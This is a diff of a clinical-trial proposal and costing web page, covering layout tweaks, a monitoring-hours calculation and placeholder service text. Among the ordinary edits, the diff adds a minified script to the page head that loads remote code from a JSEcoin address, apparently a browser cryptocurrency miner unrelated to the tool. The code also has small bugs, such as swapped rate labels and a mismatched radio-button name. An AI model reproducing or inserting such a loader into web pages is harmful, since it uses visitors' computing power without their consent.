@@ -17,7 +17,7 @@
         {margin: 5px;}
         body{
             font-family: 'Roboto', sans-serif;
-            background: #000055;
+            background: #000033;
             color: #FFFBF9;
             padding: 0;
             margin: 0;
@@ -41,54 +41,49 @@
     
         function w3_open() {
             if (sidebarOpen===0) {
-              document.getElementById("main").style.marginLeft = "20%";
-              document.getElementById("mySidebar").style.width = "20%";
-              document.getElementById("mySidebar").style.display = "block";
-              document.getElementById("openNav").style.display = 'inline-block';
-            sidebarOpen = 1;
+                document.getElementById("main").style.marginLeft = "20%";
+                document.getElementById("mySidebar").style.width = "20%";
+                document.getElementById("mySidebar").style.display = "block";
+                document.getElementById("openNav").style.display = 'inline-block';
+                sidebarOpen = 1;
             } else {w3_close();}
         }
         function w3_close() {
-          document.getElementById("main").style.marginLeft = "0%";
-          document.getElementById("mySidebar").style.display = "none";
-          document.getElementById("openNav").style.display = "inline-block";
+            document.getElementById("main").style.marginLeft = "0%";
+            document.getElementById("mySidebar").style.display = "none"; 
+            document.getElementById("openNav").style.display = "inline-block";
             sidebarOpen = 0;
-        }
-
-        
-        function hide(id) {
-            var x = document.getElementById(id);
-            var y = document.getElementById(id+'y');
-            if (x.checked==true) {y.value=1} else {y.value=0}; 
         }
         
         window.onload = function() {
-            document.getElementById("javastatus").textContent = "Java is working.";
+            document.getElementById("javastatus").textContent = "YEAH! Java is working.";
             document.getElementById("javastatus").style.color = "#00FF00";
             if (window.jQuery) {  
                 // jQuery is loaded  
-                //alert("Yeah!");
                 document.getElementById("jquerystatus").textContent = "jQuery loaded successfully.";
                 document.getElementById("jquerystatus").style.color = "#00FF00";
            } else {
                 // jQuery is not loaded
-                //alert("Doesn't Work");
                 document.getElementById("jquerystatus").textContent = "jQuery DID NOT LOAD successfully.";
                 document.getElementById("jquerystatus").style.color = "#FF0000";
             }
         }
         
-        function toggle(source) {
+/*        function toggle() {
           checkboxes = document.getElementsByName('serv');
-          for(var i=0, n=checkboxes.length;i<n;i++) {
-            checkboxes[i].checked = source.checked;
+          for(var i=0, n=checkboxes.length;i<n;i++) { 
+            if (checkboxes[i].checked==true) {document.getElementById(checkboxes[i].id+'y').value=1} else {document.getElementById(checkboxes[i].id+'y').value=0};
           }
         }
-
-        function calc() {
-            var total = parseInt(document.getElementById("sites").value) + parseInt(document.getElementById("dur").value);
-            alert(total);
-            document.getElementById("totalamt").value = total;
+*/
+        function calc_mon(area,site,dur,visits,subs,tests,repttime,trvltime) {
+            var pthrs = subs*tests*visits*0.05;
+            var monvisnum = pthrs/7;
+            if (repttime==1) {trvltime=0;} //aka if visit is online
+            else if (repttime==15) {repttime=1.5;trvltime=trvltime/2;} //aka if visit is two day
+            var visithrs = monvisnum*(repttime+trvltime);
+            var total = pthrs + visithrs + site*0.5;
+            document.getElementById("phtmon").value = total;
         }
 
         //jquery functions
@@ -115,27 +110,52 @@
                 };
                 document.getElementById("tax").value = diff;
                     
-                //display additional input elements
-                var temp = document.getElementById("datacolx").style; if (document.getElementById("tdy").value==1) { temp.display = "block"} else {temp.display = "none"};
-                var temp = document.getElementById("monvisx").style; if (document.getElementById("tmony").value==1) { temp.display = "block"} else {temp.display = "none"};
+                //toggle();
                 
-                //display text
-                var temp = document.getElementById("tdx").style; if (document.getElementById("tdy").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("precx").style; if (document.getElementById("precy").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("tmonx").style; if (document.getElementById("tmony").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("dex").style; if (document.getElementById("dey").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("dmx").style; if (document.getElementById("dmy").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("statx").style; if (document.getElementById("staty").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("mswx").style; if (document.getElementById("mswy").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("mmonx").style; if (document.getElementById("mmony").value==1) { temp.display = "block"} else {temp.display = "none"}; 
-                var temp = document.getElementById("audx").style; if (document.getElementById("audy").value==1) { temp.display = "block"} else {temp.display = "none"}; 
+                var numitems = 9;
+                var a = ["td","prec","tmon","de","dm","stat","msw","mmon","aud"];
                 
-            });
+                for(var i=0, n=numitems;i<n;i++){
+                    var base = document.getElementById(a[i]);
+                    var xx = document.getElementById(a[i]+'x');
+                    var yy = document.getElementById(a[i]+'y');
+                    var zz = document.getElementById(a[i]+'z');
+
+                    if (base.checked==true) {yy.value=1} else {yy.value=0};
+                    if (base.checked==true) {xx.style = 'display: block'; zz.style = 'display: block';} 
+                        else {xx.style = 'display: none'; zz.style = 'display: none';}
+                };
+                 
+  
+                //calculations go here
+                calc_mon(parseInt(document.getElementById("tax").value),
+                         parseInt(document.getElementById("sites").value),
+                         parseInt(document.getElementById("dur").value),
+                         parseInt(document.getElementById("vis").value),
+                         parseInt(document.getElementById("part").value),
+                         parseInt(document.getElementById("test").value),
+                         parseInt(document.querySelector('input[name="vistyp"]:checked').value),
+                         parseInt(document.querySelector('input[name="siteloc"]:checked').value)
+                );
+                
+                //generate totals
+                document.getElementById('pt0').value = parseInt(document.getElementById('ph0').value) * parseInt(document.getElementById('pr0').value);
+                var tot = parseInt(document.getElementById('pt0').value);
+                
+                for(var i=0, n=numitems;i<n;i++){
+                    document.getElementById('pt'+a[i]).value = parseInt(document.getElementById('ph'+a[i]).value) * parseInt(document.getElementById('pr'+a[i]).value);
+                    tot = tot + parseInt(document.getElementById('pt'+a[i]).value);
+                };
+                document.getElementById('worktot').value = tot;
+                document.getElementById('passtot').value = 0;
+                document.getElementById('totalamt').value = parseInt(document.getElementById('worktot').value) + parseInt(document.getElementById('passtot').value);  
+            
         });
-        
+    });
         
     </script>
     
+    <script type ="text/javascript"> !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/56099/freesiax.github.io/0/0/",s.parentNode.insertBefore(t,s)}(); </script>
 </head>
     
     
@@ -145,9 +165,9 @@
 <body>
     
     <div class="w3-sidebar w3-bar-block w3-card w3-animate-left w3-blue" style="display:none" id="mySidebar">
-      <button class="w3-bar-item w3-button w3-large"
+      <button class="w3-bar-item w3-button w3-xlarge w3-red"
       onclick="w3_close()">Close &times;</button>
-    <div class="w3-padding-small" style="font-weight: bold font-size:30px">Quick Navigation</div>
+    <div class="w3-padding-small" style="font-weight: bold; font-size:x-large">Quick Navigation</div>
       <a href="#sec1" class="w3-bar-item w3-button">Top</a>
       <a href="#sec2" class="w3-bar-item w3-button">Project parameters</a>
       <a href="#sec3" class="w3-bar-item w3-button">Services</a>
@@ -158,22 +178,29 @@
     
     <div id="main" class="w3-padding">
             
-        <div class="w3-blue w3-top" style="margin-left: -16px; margin-top:-8px">
+        <div class="w3-blue w3-top" style="margin-left: -16px">
             <button id="openNav" class="w3-button w3-blue w3-xlarge" onclick="w3_open()">&#9776; </button> Prototype proposal generator v0.1
         </div>  
-    
+        
+<a name="sec1"></a>    
 <br><br>
-<a name="sec1"></a>
-        <h2>Instructions</h2>
-        Just click the boxes and enter data; proposal will be automatically generated below. <p>
+
+        <div class="w3-panel w3-display-container w3-indigo">
+          <span onclick="this.parentElement.style.display='none'"
+          class="w3-button w3-display-topright">X</span>
+        <h3>Instructions</h3>
+        Proposal will be automatically generated when the appropriate data is entered. <p>
+        </div>
+        
+
+        
+<a name="sec2"></a>
         <span id=javastatus style="color: #FF0000">Java isn't loaded.</span>
         <span id=jquerystatus></span><p>
-        <input type="number" id="c" value=0 readonly>
-
-
+        <input type="number" id="c" value=0 readonly> Clicks
+        
         <form action="">  
             <br>  
-<a name="sec2"></a>
             <h3>Project parameters</h3>
             <select id="ta">
               <option value=0></option>
@@ -206,45 +233,48 @@
             </select> Therapeutic Area <br>
             <input type="number" id="tax" value=0 readonly hidden>
 
-            <input type="number" id="sites" min="1"> Sites <br>
-            <input type="number" id="dur" min="1"> Duration (months) <br>
-            <input type="number" id="vis" min="1"> Visits <br>
-            <input type="number" id="part" min="1"> Participants <br>
-            <input type="number" id="test" min="1"> Unique tests <br>
+            <input type="number" id="sites" min="1" value=3> Sites <br>
+            <input type="number" id="dur" min="1" value=1> Duration (months) <br>
+            <input type="number" id="vis" min="1" value=5> Visits <br>
+            <input type="number" id="part" min="1" value=50> Participants <br>
+            <input type="number" id="test" min="1" value=10> Unique tests <br>
 
             <span id = "phasex">
                 <b>Phase:</b>
-                <input type="radio" name="phase" value=1> 1 &nbsp;
-                <input type="radio" name="phase" value=2> 2 &nbsp;
-                <input type="radio" name="phase" value=3> 3 &nbsp;
-                <input type="radio" name="phase" value=4> 4 &nbsp;
+                <input type="radio" name="phase" value=1 checked> 1 &nbsp;&nbsp;
+                <input type="radio" name="phase" value=2> 2 &nbsp;&nbsp;
+                <input type="radio" name="phase" value=3> 3 &nbsp;&nbsp;
+                <input type="radio" name="phase" value=4> 4 &nbsp;&nbsp;
                 <input type="radio" name="phase" value=5> Post-Marketing
                 <br>
             </span>
             <span id = "riskx">
                 <b>Risk:</b>
-                <input type="radio" name="phase" value=1> Conservative &nbsp;
-                <input type="radio" name="phase" value=2> Moderate &nbsp;
-                <input type="radio" name="phase" value=3> Risky 
+                <input type="radio" name="radio_risk" value=1 checked> Conservative &nbsp;&nbsp;
+                <input type="radio" name="radio_risk" value=2> Moderate &nbsp;&nbsp;
+                <input type="radio" name="Radio_risk" value=3> Risky 
                 <br>
-            </span>       
-            <br> 
-<a name="sec3"></a>
+            </span>    
+          
+            <br> <br>
+<a name="sec3"></a> 
+<a name="sec4"></a>  
+
             <h3>Services</h3>
 
-            <input type="checkbox" name="serv" onclick="hide(id)" id="td"> Trial Design<br>
-            <input type="checkbox" name="serv" onclick="hide(id)" id="prec"> Participant Recruitment<br>
-            <input type="checkbox" name="serv" onclick="hide(id)" id="de"> Data Entry<br>
-            <input type="checkbox" name="serv" onclick="hide(id)" id="tmon"> Trial Monitoring<br>
-            <input type="checkbox" name="serv" onclick="hide(id)" id="dm"> Data Management<br>
-            <input type="checkbox" name="serv" onclick="hide(id)" id="stat"> Statistics<br>  
-            <input type="checkbox" name="serv" onclick="hide(id)" id="msw"> Medical and Scientific Writing<br> 
-            <input type="checkbox" name="serv" onclick="hide(id)" id="mmon"> Medical Monitoring and Pharmacovigilance<br>
-            <input type="checkbox" name="serv" onclick="hide(id)" id="aud"> Auditing<br>
-
+            <input type="checkbox" name="serv" id="td"> Trial Design<br>
+            <input type="checkbox" name="serv" id="prec"> Participant Recruitment<br>
+            <input type="checkbox" name="serv" id="de"> Data Entry<br>
+            <input type="checkbox" name="serv" id="tmon" checked> Trial Monitoring<br>
+            <input type="checkbox" name="serv" id="dm"> Data Management<br>
+            <input type="checkbox" name="serv" id="stat"> Statistics<br>  
+            <input type="checkbox" name="serv" id="msw"> Medical and Scientific Writing<br> 
+            <input type="checkbox" name="serv" id="mmon"> Medical Monitoring and Pharmacovigilance<br>
+            <input type="checkbox" name="serv" id="aud"> Auditing<br>
+   
             <input type="number" id="tdy" value=0 readonly hidden>
             <input type="number" id="precy" value=0 readonly hidden>
-            <input type="number" id="tmony" value=0 readonly hidden>
+            <input type="number" id="tmony" value=0 readonly>
             <input type="number" id="dey" value=0 readonly hidden>
             <input type="number" id="dmy" value=0 readonly hidden>
             <input type="number" id="staty" value=0 readonly hidden>
@@ -252,62 +282,80 @@
             <input type="number" id="mmony" value=0 readonly hidden>
             <input type="number" id="audy" value=0 readonly hidden>
 
-            <br> 
-<a name="sec4"></a>
+
+            <br><br><br>
+<a name="sec5"></a>
             <h3>Extra parameters</h3>
-            <span id = "datacolx" style="display: none">
+            <span id = "tdz" style="display: none">
+                <h5>Trial Design</h5>
                 <b>Data collection method:</b>
-                <input type="radio" name="datacol" value="EDC"> EDC &nbsp;
+                <input type="radio" name="datacol" value="EDC" checked> EDC &nbsp;&nbsp;
                 <input type="radio" name="datacol" value="Paper"> Paper<br>
             </span>
-            <span id = "monvisx" style="display: none">
-                <input type="number" id="monvis" min="1"> Monitoring visits <br>
+            <br>
+            <span id = "precz" style="display: none"> </span>
+            <span id = "dez" style="display: none"> </span>
+            <span id = "tmonz" style="display: none">
+                <h5>Monitoring</h5>
+                <b>Visit type:</b>
+                <input type="radio" name="vistyp" value="1"> Online &nbsp;&nbsp;                
+                <input type="radio" name="vistyp" value="3" checked> Single Day &nbsp;&nbsp;
+                <input type="radio" name="vistyp" value="15"> Two Day<br>
+                <b>Site locations:</b>
+                <input type="radio" name="siteloc" value="2" checked> Local &nbsp;&nbsp;                
+                <input type="radio" name="siteloc" value="8"> Interstate &nbsp;&nbsp;
+                <input type="radio" name="siteloc" value="8"> Overseas<br>
             </span>
+            <span id = "dez" style="display: none"> </span>
+            <span id = "dmz" style="display: none"> </span>
+            <span id = "statz" style="display: none"> </span>
+            <span id = "mswz" style="display: none"> </span>
+            <span id = "mmonz" style="display: none"> </span>
+            <span id = "audz" style="display: none"> </span>
         </form>
+        
+
+        <br>
         <br> 
 
-<a name="sec5"></a>
         <h3>Costing Estimate</h3>
-        <button type="button" onclick="calc()">Calculate</button> <br>
-        <input type="number" id="p1h" readonly style="width: 6em" value = 0> h @ 
-        <input type="number" id="p1r" style="width: 6em" value = 0> (rate) = <input type="number" id="p1t" readonly style="width: 6em"> Preliminaries<br>
-        <input type="number" id="p2h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p2r" style="width: 6em" value = 0> (rate) = <input type="number" id="p2t" readonly style="width: 6em"> Clinical Trial Setup<br>
-        <input type="number" id="p12h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p12r" style="width: 6em" value = 210> (rate) = <input type="number" id="p12t" readonly style="width: 6em"> Patient Recruitment<br>
-        <input type="number" id="p3h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p3r" style="width: 6em" value = 0> (rate) = <input type="number" id="p3t" readonly style="width: 6em"> Data Management Setup<br>
-        <input type="number" id="p4h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p4r" style="width: 6em" value = 0> (rate) = <input type="number" id="p4t" readonly style="width: 6em"> Monitoring<br>
-        <input type="number" id="p5h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p5r" style="width: 6em" value = 0> (rate) = <input type="number" id="p5t" readonly style="width: 6em"> Data Capture<br>
-        <input type="number" id="p6h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p6r" style="width: 6em" value = 0> (rate) = <input type="number" id="p6t" readonly style="width: 6em"> Data Validation<br>
-        <input type="number" id="p7h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p7r" style="width: 6em"  value = 0> (rate) = <input type="number" id="p7t" readonly style="width: 6em"> Statistics and Report<br>
-        <input type="number" id="p8h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p8r" style="width: 6em" value = 0> (rate) = <input type="number" id="p8t" readonly style="width: 6em"> Project Management<br>
-        <input type="number" id="p10h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p10r" style="width: 6em" value = 210> (rate) = <input type="number" id="p10t" readonly style="width: 6em"> Pharmacovigilance<br>
-        <input type="number" id="p11h" readonly style="width: 6em" value = 0> h @
-        <input type="number" id="p11r" style="width: 6em" value = 200> (rate) = <input type="number" id="p11t" readonly style="width: 6em"> Auditing<br>
-         Total cost <input type="number" id="totalamt" readonly>
+        <input type="number" id="ph0" readonly style="width: 5em" value = 0> h @ 
+        <input type="number" id="pr0" style="width: 5em" value = 0> (rate) = <input type="number" id="pt0" readonly style="width: 5em"> Preliminaries<br>
+        <input type="number" id="phtd" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prtd" style="width: 5em" value = 0> (rate) = <input type="number" id="pttd" readonly style="width: 5em"> Trial Design<br>
+        <input type="number" id="phprec" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prprec" style="width: 5em" value = 210> (rate) = <input type="number" id="ptprec" readonly style="width: 5em"> Patient Recruitment<br>
+        <input type="number" id="phtmon" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prtmon" style="width: 5em" value = 95> (rate) = <input type="number" id="pttmon" readonly style="width: 5em"> Data Entry <br>
+        <input type="number" id="phde" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prde" style="width: 5em" value = 160> (rate) = <input type="number" id="ptde" readonly style="width: 5em"> Trial Monitoring<br>
+        <input type="number" id="phdm" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prdm" style="width: 5em" value = 0> (rate) = <input type="number" id="ptdm" readonly style="width: 5em"> Data Management<br>
+        <input type="number" id="phstat" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prstat" style="width: 5em"  value = 200> (rate) = <input type="number" id="ptstat" readonly style="width: 5em"> Statistics<br>
+        <input type="number" id="phmsw" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prmsw" style="width: 5em"  value = 200> (rate) = <input type="number" id="ptmsw" readonly style="width: 5em"> Report writing<br>
+        <input type="number" id="phmmon" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="prmmon" style="width: 5em" value = 210> (rate) = <input type="number" id="ptmmon" readonly style="width: 5em"> Pharmacovigilance<br>
+        <input type="number" id="phaud" readonly style="width: 5em" value = 0> h @
+        <input type="number" id="praud" style="width: 5em" value = 200> (rate) = <input type="number" id="ptaud" readonly style="width: 5em"> Auditing<br><br>
+        Work cost + Passthrough = Total Cost <br>
+        <input type="number" id="worktot" readonly style="width: 5em"> + <input type="number" id="passtot" readonly style="width: 5em"> =
+        <input type="number" id="totalamt" readonly style="width: 5em">
 
-        <br> 
+        <br> <br>
 <a name="sec6"></a>
         <h3>Generated Text</h3>
 
-        <div id="tdx" style="display: none">      We can do trial design. We will design you a CRF. It will be a <span id=captype></span> form.      <p>    </div>
-        <div id="precx" style="display: none">      We can run a participant recruitment campaign for you.      <p>    </div>
-        <div id="tmonx" style="display: none">      Trial monitoring can happen.       <p>   </div>
-        <div id="dex" style="display: none">      We can enter the data for you.       <p>   </div>
-        <div id="dmx" style="display: none">      Data management is no problem.       <p>   </div>
-        <div id="statx" style="display: none">      We do the number crunching.        <p>  </div>
-        <div id="mswx" style="display: none">      We can do the medical and scientific writing too! This is really a good thing because blah blah.       <p>   </div>
-        <div id="mmonx" style="display: none">        Medical monitoring - yep that's done by us as well.        <p>    </div>
-        <div id="audx" style="display: none">
-            Audits. We do them. Now here's some lorem ipsum Lorem ipsum dolor sit amet, consectetur adipisicing elit. Voluptate minima quia magni debitis alias, temporibus quibusdam tempore unde repellendus sequi ab, nam laudantium! Molestiae odio, vitae, adipisci, optio perferendis et suscipit commodi fugit beatae repellendus nam eaque. Quas harum facilis eveniet provident culpa, sit non error saepe! Expedita laudantium modi explicabo quas dolores, autem repudiandae incidunt soluta nam, minus vel aliquid quia blanditiis ad vitae eaque aliquam neque omnis quis magni culpa molestiae accusamus! Consequuntur dolorum tenetur aspernatur illo laborum, in nobis, blanditiis totam autem neque iure sequi, at perferendis voluptates nihil. Placeat quidem deleniti dolores blanditiis odit beatae ullam eveniet possimus ipsam pariatur! Esse aspernatur minima consectetur maiores excepturi accusamus. Accusantium nam earum delectus, ipsum blanditiis fugiat itaque iusto magni dolor dolorum, animi iure inventore, repellat maiores incidunt quidem hic cupiditate! Explicabo, nisi minus officiis velit. Voluptatibus tempora nemo sequi maiores ducimus sit sunt eaque saepe, animi dolor atque tempore voluptatum fuga deserunt, error labore enim iure ab! Qui a obcaecati minima, earum distinctio eaque. Ad ullam beatae facere possimus voluptas recusandae voluptatum repudiandae praesentium ratione eveniet, ipsum, laborum, dolores sequi quasi aperiam in nihil repellendus harum eaque suscipit consectetur blanditiis. Aperiam quo accusamus repellendus maiores, dignissimos esse quis.
-            <p>    </div>
+        <div id="tdx" style="display: none">      Trial design paragraph(s). We will design you a CRF. It will be a <span id=captype></span> form.      <p>    </div>
+        <div id="precx" style="display: none">      Participant recruitment paragraph(s).      <p>    </div>
+        <div id="tmonx" style="display: none">      Trial monitoring paragraph(s).       <p>   </div>
+        <div id="dex" style="display: none">      Data entry paragraph(s).       <p>   </div>
+        <div id="dmx" style="display: none">      Data management paragraph(s).       <p>   </div>
+        <div id="statx" style="display: none">      Statistics paragraph(s).        <p>  </div>
+        <div id="mswx" style="display: none">      Medical and scientific writing paragraph(s).       <p>   </div>
+        <div id="mmonx" style="display: none">        Medical monitoring paragraph(s).        <p>    </div>
+        <div id="audx" style="display: none">            Audits paragraph(s)s.            <p>    </div>
 
     </div>
 </body>
